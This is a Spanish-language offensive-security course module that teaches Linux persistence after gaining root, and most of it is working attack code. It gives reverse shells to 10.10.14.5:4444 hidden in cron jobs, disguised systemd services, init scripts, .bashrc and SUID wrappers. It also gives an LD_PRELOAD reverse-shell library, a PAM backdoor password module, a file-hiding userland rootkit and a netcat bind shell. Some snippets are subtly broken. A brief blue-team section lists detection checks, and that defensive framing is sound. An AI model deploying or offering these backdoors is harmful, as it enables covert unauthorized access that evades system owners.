# 🔄 Persistencia en Linux

> *"Escalaste a root. Ahora necesitas mantenerte ahí. Este documento cubre cómo establecer persistencia en sistemas Linux de forma que sobreviva reinicios, cambios de contraseña y limpiezas básicas."*

---

## 📋 Tabla de contenido

1. [SSH keys](#1-ssh-keys)
2. [Cron jobs](#2-cron-jobs)
3. [Systemd services](#3-systemd-services)
4. [Init scripts](#4-init-scripts)
5. [SUID binaries](#5-suid-binaries)
6. [LD_PRELOAD hijacking](#6-ld_preload-hijacking)
7. [Bashrc/profile injection](#7-bashrcprofile-injection)
8. [PAM backdoors](#8-pam-backdoors)
9. [Rootkit (userland)](#9-rootkit-userland)
10. [Herramientas](#10-herramientas)
11. [Defensa y remediación](#11-defensa-y-remediación)
12. [Referencias](#12-referencias)

---

## 1. SSH keys

La forma más limpia y persistente de mantener acceso.

### Backdoor SSH key del usuario

```bash
# 1. Generar par de claves (en tu máquina atacante)
ssh-keygen -t ed25519 -f attacker_key -N ""

# 2. Copiar la clave pública al target
echo "ssh-ed25519 AAAA... attacker@attacker" >> ~/.ssh/authorized_keys

# 3. Asegurar permisos
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# 4. Conectar desde tu máquina
ssh -i attacker_key victim@target
```

### Backdoor SSH key global (todos los usuarios)

```bash
# Añadir clave a root para que cualquier usuario pueda acceder
echo "ssh-ed25519 AAAA... attacker@attacker" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# O copiar a todos los usuarios con shell
for user in $(cat /etc/passwd | grep -v nologin | grep -v /bin/false | cut -d: -f1); do
    mkdir -p /home/$user/.ssh 2>/dev/null
    echo "ssh-ed25519 AAAA... attacker@attacker" >> /home/$user/.ssh/authorized_keys 2>/dev/null
    chmod 700 /home/$user/.ssh 2>/dev/null
    chmod 600 /home/$user/.ssh/authorized_keys 2>/dev/null
done
```

### SSH key en /etc/ssh

```bash
# Si puedes modificar sshd_config
echo "AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/backdoor_keys" >> /etc/ssh/sshd_config

# Crear archivo de claves
echo "ssh-ed25519 AAAA... attacker@attacker" > /etc/ssh/backdoor_keys
chmod 600 /etc/ssh/backdoor_keys

# Reiniciar SSH
systemctl restart sshd
```

---

## 2. Cron jobs

Los cron jobs sobreviven reinicios y se ejecutan automáticamente.

### Backdoor cron job simple

```bash
# Añadir reverse shell que se ejecuta cada 5 minutos
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'") | crontab -

# Verificar
crontab -l
# */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

### Backdoor cron como root

```bash
# Editar crontab del sistema
echo "*/10 * * * * root /opt/scripts/.hidden/backdoor.sh" >> /etc/crontab

# Crear script oculto
mkdir -p /opt/scripts/.hidden
cat > /opt/scripts/.hidden/backdoor.sh << 'EOF'
#!/bin/bash
# Verificar si ya hay conexión
if ! pgrep -f "bash -i" > /dev/null 2>&1; then
    bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
fi
EOF
chmod +x /opt/scripts/.hidden/backdoor.sh
```

### Systemd timer (alternativa a cron)

```bash
# Crear servicio
cat > /etc/systemd/system/network-check.service << 'EOF'
[Unit]
Description=Network connectivity check
After=network.target

[Service]
Type=simple
ExecStart=/opt/scripts/.hidden/backdoor.sh
Restart=always
RestartSec=300

[Install]
WantedBy=multi-user.target
EOF

# Crear timer
cat > /etc/systemd/system/network-check.timer << 'EOF'
[Unit]
Description=Run network check every 5 minutes

[Timer]
OnBootSec=60
OnUnitActiveSec=300

[Install]
WantedBy=timers.target
EOF

# Activar
systemctl daemon-reload
systemctl enable network-check.timer
systemctl start network-check.timer
```

---

## 3. Systemd services

Los servicios systemd son la forma más robusta de persistencia en Linux moderno.

### Crear servicio backdoor

```bash
# Crear el servicio
cat > /etc/systemd/system/ssh-debug.service << 'EOF'
[Unit]
Description=SSH Debug Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/10.10.14.5/4444 0>&1; sleep 300; done'
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

# Activar e iniciar
systemctl daemon-reload
systemctl enable ssh-debug.service
systemctl start ssh-debug.service

# Verificar
systemctl status ssh-debug.service
```

### Servicio disfrazado

```bash
# Usar nombres que parezcan legítimos
# network-manager.service
# system-updater.service
# certificate-check.service

cat > /etc/systemd/system/network-manager.service << 'EOF'
[Unit]
Description=Network Manager Dispatcher
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/.network-check
Restart=on-failure
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
```

---

## 4. Init scripts

Para sistemas más antiguos (SysVinit, Upstart).

### Script init

```bash
# Crear script en /etc/init.d/
cat > /etc/init.d/.hidden-service << 'EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          hidden-service
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Network monitoring service
### END INIT INFO

case "$1" in
    start)
        /bin/bash -c 'while true; do bash -i >& /dev/tcp/10.10.14.5/4444 0>&1; sleep 300; done' &
        ;;
    stop)
        pkill -f "bash -i"
        ;;
    restart)
        $0 stop
        $0 start
        ;;
esac
exit 0
EOF

chmod +x /etc/init.d/.hidden-service

# Añadir al boot
update-rc.d .hidden-service defaults
```

---

## 5. SUID binaries

Crear binarios SUID que ejecuten tu payload.

### Crear binary SUID

```bash
# Crear script wrapper
cat > /usr/local/bin/system-helper << 'EOF'
#!/bin/bash
# Ejecuta el comando legítimo
if [ "$1" == "--version" ]; then
    echo "System Helper v2.1"
else
    # Reverse shell silencioso en background
    bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' &
    # Ejecutar el comando real
    /usr/bin/$0 "$@"
fi
EOF

chmod +x /usr/local/bin/system-helper
chmod +s /usr/local/bin/system-helper
```

### Binary SUID con código legítimo

```bash
# Crear binary que parezca legítimo
cat > /tmp/helper.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    // Código legítimo
    if (argc > 1 && strcmp(argv[1], "--help") == 0) {
        printf("Usage: %s [options]\n", argv[0]);
        return 0;
    }
    
    // Payload (oculto)
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' &");
    
    // Código legítimo continuado
    printf("Operation completed.\n");
    return 0;
}
EOF

# Compilar
gcc /tmp/helper.c -o /usr/local/bin/system-helper
chmod +s /usr/local/bin/system-helper
```

---

## 6. LD_PRELOAD hijacking

Inyectar código compartido en todos los procesos del sistema.

### Crear shared library

```bash
# Crear library maliciosa
cat > /tmp/backdoor.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

__attribute__((constructor))
void init(void) {
    // Crear reverse shell en background
    if (fork() == 0) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(4444);
        addr.sin_addr.s_addr = inet_addr("10.10.14.5");
        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        execl("/bin/bash", "bash", NULL);
    }
}
EOF

# Compilar
gcc -shared -fPIC -o /usr/lib/libsystem.so /tmp/backdoor.c -nostartfiles
```

### Configurar LD_PRELOAD global

```bash
# Añadir a /etc/ld.so.preload (se ejecuta en TODOS los procesos)
echo "/usr/lib/libsystem.so" > /etc/ld.so.preload

# Verificar
cat /etc/ld.so.preload
# /usr/lib/libsystem.so
```

### Configurar LD_PRELOAD por usuario

```bash
# Añadir a .bashrc o .profile
echo 'export LD_PRELOAD=/usr/lib/libsystem.so' >> ~/.bashrc

# O a /etc/environment
echo 'LD_PRELOAD=/usr/lib/libsystem.so' >> /etc/environment
```

---

## 7. Bashrc/profile injection

Inyectar código en scripts de shell que se ejecutan en cada login.

### .bashrc

```bash
# Añadir reverse shell silencioso
echo '
# Auto-update check (payload oculto)
if [ -z "$UPDATED" ]; then
    export UPDATED=1
    bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" &
fi
' >> ~/.bashrc
```

### .profile

```bash
echo '
# Network configuration check
if [ -f /usr/local/bin/.net-check ]; then
    /usr/local/bin/.net-check &
fi
' >> ~/.profile

# Crear script oculto
cat > /usr/local/bin/.net-check << 'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' &
EOF
chmod +x /usr/local/bin/.net-check
```

### /etc/profile.d/

```bash
# Crear script que se ejecuta en cada login
cat > /etc/profile.d/.system-update.sh << 'EOF'
#!/bin/bash
# System update check
if [ -z "$SYSTEM_UPDATED" ]; then
    export SYSTEM_UPDATED=1
    /usr/local/bin/.system-helper &
fi
EOF

chmod +x /etc/profile.d/.system-update.sh
```

---

## 8. PAM backdoors

Modificar PAM para mantener acceso.

### Backdoor PAM simple

```bash
# Crear módulo PAM malicioso
cat > /tmp/pam_backdoor.c << 'EOF'
#include <stdio.h>
#include <string.h>
#include <security/pam_modules.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
    int argc, const char **argv) {
    const char *password;
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    
    // Backdoor password
    if (strcmp(password, "backdoor123") == 0) {
        return PAM_SUCCESS;
    }
    
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags,
    int argc, const char **argv) {
    return PAM_SUCCESS;
}
EOF

# Compilar (requiere headers de PAM)
gcc -shared -fPIC -o /lib/security/pam_unix.so /tmp/pam_backdoor.c -lpam
```

### Modificar PAM existente

```bash
# Añadir bypass al pam_unix.so existente
# ¡Esto es más arriesgado pero más discreto!

# Backup del original
cp /lib/security/pam_unix.so /lib/security/pam_unix.so.bak

# Añadir tu módulo primero en la stack
sed -i '1i\auth sufficient /lib/security/pam_backdoor.so' /etc/pam.d/sshd
```

---

## 9. Rootkit (userland)

Rootkits de espacio de usuario que ocultan procesos y archivos.

### Ejemplo básico: ocultar proceso

```bash
# Crear script que oculta procesos
cat > /usr/lib/libprocess-hider.so << 'EOF'
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>

struct dirent *readdir(DIR *dirp) {
    struct dirent *(*original_readdir)(DIR *) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;
    
    while ((entry = original_readdir(dirp)) != NULL) {
        if (strstr(entry->d_name, "backdoor") == NULL) {
            break;
        }
    }
    return entry;
}
EOF

# Compilar
gcc -shared -fPIC -o /usr/lib/libprocess-hider.so /tmp/rootkit.c -ldl

# Cargar con LD_PRELOAD
echo "/usr/lib/libprocess-hider.so" > /etc/ld.so.preload
```

---

## 10. Herramientas

### Evil-WinRM

```bash
# Shell persistente con Evil-WinRM
evil-winrm -i 192.168.1.100 -u administrator -p password -s /scripts/

# Con powershell personalizado
evil-winrm -i 192.168.1.100 -u administrator -p password -e payload.ps1
```

### Netcat persistent listener

```bash
# Listener que se reinicia
while true; do
    nc -lvnp 4444 -e /bin/bash
done

# O con systemd
cat > /etc/systemd/system/listener.service << 'EOF'
[Unit]
Description=Netcat Listener
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do nc -lvnp 4444 -e /bin/bash; sleep 5; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
```

### Chisel (pivoting)

```bash
# Servidor (en tu máquina)
./chisel server --reverse --port 8080

# Cliente (en el target)
./chisel client 10.10.14.5:8080 R:socks
```

---

## 11. Defensa y remediación

### Para Blue Team / Administradores

| Vector | Detección | Mitigación |
|---|---|---|
| **SSH keys** | Auditar `authorized_keys` regularmente | Usar `from=` en keys, monitorear logins |
| **Cron jobs** | `crontab -l`, `/etc/crontab` | Monitorear cambios en cron |
| **Systemd services** | `systemctl list-unit-files` | Auditar servicios nuevos |
| **SUID binaries** | `find / -perm -4000` | Eliminar SUID innecesarios |
| **LD_PRELOAD** | `cat /etc/ld.so.preload` | No usar LD_PRELOAD en producción |
| **Bashrc injection** | Auditoría de dotfiles | Version control en dotfiles |
| **PAM backdoors** | `rpm -V pam` / `debsums pam` | Verificar integridad de PAM |

### Monitoreo activo

```bash
# Script de auditoría de persistencia
#!/bin/bash
echo "=== Cron Jobs ==="
crontab -l 2>/dev/null
cat /etc/crontab 2>/dev/null
ls -la /etc/cron* 2>/dev/null

echo "=== Systemd Services ==="
systemctl list-unit-files --type=service --state=enabled

echo "=== SUID Binaries ==="
find / -perm -4000 -type f 2>/dev/null

echo "=== LD_PRELOAD ==="
cat /etc/ld.so.preload 2>/dev/null
echo $LD_PRELOAD

echo "=== SSH Keys ==="
find / -name "authorized_keys" -exec ls -la {} \; 2>/dev/null

echo "=== Startup Scripts ==="
ls -la /etc/init.d/ 2>/dev/null
ls -la /etc/profile.d/ 2>/dev/null
```

### Hardening SSH

```bash
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
AllowUsers specific_user

# Restringir ключ por IP
# En authorized_keys:
from="10.10.14.5" ssh-ed25519 AAAA... attacker@attacker
```

---

## 12. Referencias

### Fuentes primarias

| Recurso | URL |
|---|---|
| **HackTricks — Persistence** | [https://book.hacktricks.xyz/linux-hardening/persistence](https://book.hacktricks.xyz/linux-hardening/persistence) |
| **MITRE ATT&CK — Persistence** | [https://attack.mitre.org/tactics/TA0003/](https://attack.mitre.org/tactics/TA0003/) |
| **GTFOBins** | [https://gtfobins.github.io](https://gtfobins.github.io) |
| **LinPEAS** | [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng) |

### Tácticas MITRE ATT&CK

| ID | Táctica | Técnica |
|---|---|---|
| T1098 | Account Manipulation | SSH authorized_keys |
| T1053 | Scheduled Task/Job | Cron, systemd timers |
| T1543 | Create or Modify System Process | Systemd services |
| T1547 | Boot or Logon Autostart Execution | .bashrc, profile |
| T1574 | Hijack Execution Flow | LD_PRELOAD |

---

## 📝 Entregable de portafolio

```markdown
# Persistencia Linux — [Nombre del sistema]

## Contexto
- SO: Ubuntu 20.04
- Acceso actual: root
- Objetivo: mantener acceso tras reinicio

## Vector elegido
- Systemd service disfrazado (network-manager.service)
- SSH key backdoor (backup)

## Implementación
1. Crear servicio en /etc/systemd/system/network-manager.service
2. Activar con systemctl enable
3. Añadir SSH key a /root/.ssh/authorized_keys

## Detección
- `systemctl list-unit-files --type=service`
- `cat /root/.ssh/authorized_keys`

## Evidencia
- Screenshot: [enlace]
- Output de comandos: [enlace]
```

---

**[⬅ Escalada Windows](../privilege-escalation/02-windows-privesc.md)** · **[⬅ Volver al módulo](../README.md)** · **[→ Persistencia Windows](./02-windows-persistence.md)**
